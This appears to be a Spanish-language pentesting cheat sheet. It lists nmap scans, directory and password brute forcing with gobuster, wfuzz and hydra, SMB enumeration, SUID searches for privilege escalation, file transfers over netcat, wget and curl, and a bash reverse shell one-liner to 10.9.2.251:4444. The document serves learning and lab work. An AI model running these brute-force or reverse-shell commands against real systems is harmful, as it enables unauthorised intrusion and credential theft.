# Pentesting - Notes

`Pentesting Notes` es una documento donde encontraras comandos para ayudarte rapidamente a realizar pentesting desde lo mas básico a lo avanzado.

## Nmap

1. Usar **-T2** para entornos reales

   ```bash
   nmap -p- --open -T5 -v -n <TARGET_IP> -oG allPorts
   ```

2. Si quiere que el escaneo sea muy pero muy rápido (no es aconsejado en pentesting real), utilizar el comando **-sS** (tcp syn port scan) y el parámetro **--min-rate** (controla el número de paquetes que quieres enviar, por ejemplo 5000 por segundo) y el comando **-Pn** (es para evitar el descubrimiento de host mediante la resolución de nombre del protocolo ARP). 

   ```bash
   nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn <TARGET_IP> -oG allPorts
   ```

3. Escaneo de **puertos**

   ```bash
   nmap -sC -sV -p22,80 <TARGET_IP> -oN targeted
   ```

4. Usando **script**

   ```bash
   nmap -sV -vv --script vuln <TARGET_IP>
   ```

## Gobuster

1. Para realizar ataques de **fuerza bruta** contra URI (directorios y archivos), subdominios DNS y nombres de host virtuales

   ```bash
   gobuster -u http://example.com -w wordlist.txt dir
   ```
   ```bash
   gobuster dir -u http://<TARGET_IP>:<PORT> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
   ```

## wfuzz

1. Para realizar ataques de **fuerza bruta** en APIs

   ```bash
   wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login --hc 405
   ```

## Hydra

1. Para realizar ataques de **fuerza bruta** de contraseñas FTP, SSH

   ```bash
   hydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt -vV <TARGET_IP> ftp
   ```
   ```bash
   hydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt -vV <TARGET_IP> ssh
   ```
   ```bash
   hydra -l <username> -P passlist.txt ftp://<TARGET_IP>
   ```
   ```bash
   hydra -l <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
   ```
   ```bash
   hydra -l <username> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "login/:username=^USER^&password=^PASS^:F=incorrect" -V
   ```

## Enum4linux: SMB

1. Enum4linux es una herramienta que se utiliza para enumerar recursos compartidos SMB tanto en sistemas Windows como Linux. Opciones **-U** (get userlist), **-M** (get machine list), **-N** (get namelist dump (different from -U and-M)), **-S**  (get sharelist), **-P**  (get password policy information), **-G** (get group and member list) and **-a** (all of the above (full basic enumeration)).

   ```bash
   enum4linux -a <TARGET_IP> 
   ```

2. Para acceder de forma remota al recurso compartido SMB

   ```bash
   smbclient //<TARGET_IP>/<SHARE>
   ```  

## Rockyou

1. Descomprimir

   ```bash
   gzip -d /usr/share/wordlists/rockyou.txt.gz
   ```

## SSH

1. Realizar un conexión remota

   ```bash
   ssh user@<TARGET_IP>
   ```
   ```bash
   ssh -oHostKeyAlgorithms=+ssh-rsa user@<TARGET_IP>
   ```

## NSF

1. Montar NFS compartidos

   ```bash
   sudo mount -t nfs IP:share /tmp/mount/ -nolock
   ```


# Linux: Privilege escalation

1. Buscar permisos en todos los archivos SUID

   ```bash
   find / -user root -perm -4000 -exec ls -ldb {} \; 
   ```
   ```bash
   find / -perm -u=s -exec ls -l {} \; 2>/dev/null 
   ```


# Linux: Comandos mas usados

1. Para trasnferir archivos usando nc

   Ejecutar en el host donde va a pasar los archivos
   ```bash
   nc -l -p 1234 > LinEnum.sh 
   ```
   Ejecutar host donde estan los archvios
   ```bash
   cat /home/user/tools/privesc-scripts/LinEnum.sh | nc 10.9.2.251 1234
   ```

2. Para trasnferir archivos usando python3 y wget o curl

   Ejetuar en donde estan los archivos
   ```bash
   python3 -m http.server 8080 
   ```
   Ejecutar en donde descargar los archivos
   ```bash
   wget http://10.9.2.251:8080/lse.sh -O /home/sn0w/lse.sh 
   ```
   ```bash
   curl -o /home/sn0w/lse.sh http://10.9.2.251:8080/lse.sh 
   ```
3. Encontrar archivos

   ```bash
   find -name passwords.txt 
   ```
   ```bash
   find -name *.txt 
   ```
 4. Poner en escucha con netcat

   ```bash
   nc -nlvp 4444
   ```
 5. Crear una reverse shell TCP

   ```bash
   /bin/bash -c 'bash -i >& /dev/tcp/10.9.2.251/4444 0>&1'
   ``` 

# Sitios Web

1. Para descifrar hashes de contraseñas débiles

   ```bash
   https://crackstation.net/
   ```
2. Para buscar exploit's

   ```bash
   https://www.exploit-db.com/exploits/
   ```
3. Para buscar CVE's

   ```bash
   https://nvd.nist.gov/vuln/search
   ```
   ```bash
   https://cve.mitre.org/
   ```
   ```bash
   https://www.cvedetails.com/
   ```
4. Para codificar y decodificar

   ```bash
   https://gchq.github.io/CyberChef/
   ```
   ```bash
   https://appdevtools.com/base64-encoder-decoder
   ```


# Extensiones para web browser

1. Ripper Web Content | Capture Metadata Content

   Ofrecido por Miguel Segovia - Correo electrónico miguelsegovia21@gmail.com 
   ```bash
   https://chromewebstore.google.com/detail/ripper-web-content-captur/popfhajlkgkiecedhefhifccngogomgh?hl=es-419&utm_source=ext_sidebar
   ```

2. User-Agent Switcher for Chrome

   Desarrollador Google 1600 Amphitheatre Pkwy Mountain View, CA 94043 US - Correo electrónico cbe-cws-admins@google.com
   ```bash
   https://chromewebstore.google.com/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg?hl=es-419&utm_source=ext_sidebar
   ```
